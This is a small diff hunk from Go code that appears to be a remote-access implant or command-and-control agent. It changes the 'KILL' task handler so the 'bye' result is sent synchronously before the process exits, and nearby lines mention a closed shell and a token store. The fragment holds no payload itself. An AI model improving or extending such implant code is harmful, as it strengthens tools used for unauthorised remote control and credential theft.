@@ -1426,7 +1426,7 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, "[+] shell closed", "")
 
 	case "KILL":
-		go t.sendResult(task.ID, "bye", "")
+		t.sendResult(task.ID, "bye", "")
 		os.Exit(0)
 
 	// ── Token Store ───────────────────────────────────────────────────────────
